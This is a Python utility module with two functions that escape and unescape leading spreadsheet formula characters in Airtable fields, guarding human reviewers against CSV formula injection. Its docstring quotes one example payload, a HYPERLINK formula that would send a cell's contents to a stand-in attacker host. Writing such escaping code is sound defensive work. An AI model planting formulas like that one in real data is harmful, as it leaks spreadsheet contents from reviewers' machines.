"""
Spreadsheet-formula safety for values that end up in front of a human.

Extracted from `pipeline.py` (2026-08-14) so `outreach/sender.py` can reuse it without
importing the pipeline: `import main` executes the NICHES construction and
drags in discovery, enrichment, influencers and browser_email — which pulls
Playwright into a process whose only job is to render an email. `pipeline.py`
imports from here, so there is one implementation, not two.

The pair matters as much as the function. `csv_safe()` is applied on the way
INTO Airtable; anything reading those cells back out and using them as data —
rather than displaying them — has to undo it, or it works with a value that no
longer matches reality.
"""

SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str) -> str:
    """
    Neutralise a value that a spreadsheet would otherwise run as a formula.

    WHY this exists at all — it looks like a pointless prefix until you
    follow the value to where a human actually reads it:

      - Airtable is NOT a formula-eval context for these values, so nothing
        executes when the record is pushed. That is why this is easy to
        mistake for dead code and "clean up". Don't.
      - But this pipeline's entire purpose is to hand rows to a HUMAN
        reviewer, and the normal thing a reviewer does with an Airtable view
        is export it to CSV and open it in Excel or Google Sheets. THAT is a
        formula-eval context: a cell starting with =, +, -, @ or a leading
        tab/CR is parsed as a formula, not as text.
      - Two of the fields we write are attacker-influenced. "Channel Name"
        is whatever the channel owner typed, and "Email" can come out of
        enrichment/email_browser.py, which reads arbitrary third-party websites. A
        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
        a live payload in the reviewer's spreadsheet — classic CSV (formula)
        injection, and the reviewer's machine is the target, not ours.

    A leading apostrophe is the fix because it is what spreadsheets
    themselves use to mean "this cell is literal text": Excel and Sheets
    both consume it on import and display the original string.

    Deliberately conservative about what it touches:

      - Only the FIRST character is examined. "Bob's Home Theater" and
        `a-b@c.com` contain dangerous characters but cannot start a formula,
        and mangling ordinary channel names/addresses would make the field
        wrong for every honest candidate to defend against a rare one.
      - Non-strings (and empty strings/None) pass straight through with
        their type intact. Several record fields are genuinely numeric and
        Airtable's Number fields reject strings, so stringifying here would
        break the push for every record.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
        return "'" + value
    return value


def csv_unsafe(value: str) -> str:
    """
    Undo `csv_safe()` when reading a cell back to USE it, not to display it.

    Added 2026-08-14 after the outreach review found two live consequences of
    reading these cells raw:

      - A creator named `-Bob's AV` is stored as `'-Bob's AV`, so a templated
        greeting renders **"Hey '-Bob's AV,"** in brand-approved copy.
      - `EMAIL_PATTERN` accepts `+` and `-` as a first character, so a real
        address like `+promo@studio.com` is stored as `'+promo@studio.com` and
        then FAILS `EMAIL_PATTERN.fullmatch` at send time. The prospect is
        silently skipped and parks in the "awaiting outreach" view forever,
        looking un-actioned rather than un-sendable.

    Strips at most ONE leading apostrophe, and only when the next character is
    one the encoder would actually have escaped. That asymmetry is deliberate:
    a channel genuinely named `'Round Midnight Audio` starts with an
    apostrophe the encoder never added, and blindly stripping it would corrupt
    an honest name. Checking the second character makes this an inverse of
    `csv_safe()` rather than a general apostrophe-remover.

    Not idempotent-by-accident: `''=x` -> `'=x` -> `=x` would need two calls,
    but `csv_safe()` is only ever applied once on write, so a doubly-escaped
    value indicates a bug upstream rather than something to paper over here.
    """
    if not isinstance(value, str) or len(value) < 2:
        return value
    if value[0] == "'" and value[1] in SPREADSHEET_FORMULA_PREFIXES:
        return value[1:]
    return value
